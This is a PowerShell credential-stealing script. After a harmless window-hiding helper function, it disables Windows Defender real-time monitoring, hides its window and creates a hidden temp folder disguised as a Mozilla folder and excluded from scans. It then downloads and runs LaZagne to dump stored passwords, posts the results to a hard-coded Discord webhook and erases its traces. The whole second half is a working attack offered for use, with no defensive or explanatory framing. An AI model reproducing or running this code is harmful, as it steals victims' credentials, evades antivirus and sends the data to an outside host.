function Set-WindowState {
    [CmdletBinding(DefaultParameterSetName = 'InputObject')]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [Object[]] $InputObject,

        [Parameter(Position = 1)]
        [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
                     'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
                     'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
        [string] $State = 'SHOW',
        [switch] $SuppressErrors = $false,
        [switch] $SetForegroundWindow = $false
    )

    Begin {
        $WindowStates = @{
        'FORCEMINIMIZE'         = 11
            'HIDE'              = 0
            'MAXIMIZE'          = 3
            'MINIMIZE'          = 6
            'RESTORE'           = 9
            'SHOW'              = 5
            'SHOWDEFAULT'       = 10
            'SHOWMAXIMIZED'     = 3
            'SHOWMINIMIZED'     = 2
            'SHOWMINNOACTIVE'   = 7
            'SHOWNA'            = 8
            'SHOWNOACTIVATE'    = 4
            'SHOWNORMAL'        = 1
        }

        $Win32ShowWindowAsync = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru

        if (!$global:MainWindowHandles) {
            $global:MainWindowHandles = @{ }
        }
    }

    Process {
        foreach ($process in $InputObject) {
            $handle = $process.MainWindowHandle

            if ($handle -eq 0 -and $global:MainWindowHandles.ContainsKey($process.Id)) {
                $handle = $global:MainWindowHandles[$process.Id]
            }

            if ($handle -eq 0) {
                if (-not $SuppressErrors) {
                    Write-Error "Main Window handle is '0'"
                }
                continue
            }

            $global:MainWindowHandles[$process.Id] = $handle

            $Win32ShowWindowAsync::ShowWindowAsync($handle, $WindowStates[$State]) | Out-Null
            if ($SetForegroundWindow) {
                $Win32ShowWindowAsync::SetForegroundWindow($handle) | Out-Null
            }

            Write-Verbose ("Set Window State '{1} on '{0}'" -f $MainWindowHandle, $State)
        }
    }
}

Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
Set-MpPreference -DisableRealtimeMonitoring $true
Get-Process -ID $PID | Set-WindowState -State HIDE
#TEMP location
$dir = "C:\Users\$env:UserName\AppData\Local\Temp\mozilla-temp-fiIes"
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
$hide = Get-Item $dir -Force
$hide.attributes='Hidden'

#lazagne
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "$dir\lazagne.exe"
& "$dir\lazagne.exe" all > "$dir\output.txt"

#Exfil
$webhookUrl = "https://discord.com/api/webhooks/1249976768627085332/Xl5YJbv0fAS6pM_G0syZtcXjGtbZx59fDyMpl5RwR9xz-OchCdTtl_oMjkJlD7xp7NvH"
$fileContent = Get-Content -Path "$dir\output.txt" -Raw
$JsonBody = @"
{
    "embeds": [
        {
            "title": "Exfiltration successful :3",
            "description": "$($fileContent -replace '(["\\])', '\\$1')"
        }
    ]
}
"@
Write-Output $JsonBody
Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $JsonBody -ContentType "application/json"


# Clean up
Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir
Clear-History

# Reboot the system
#Restart-Computer -Force
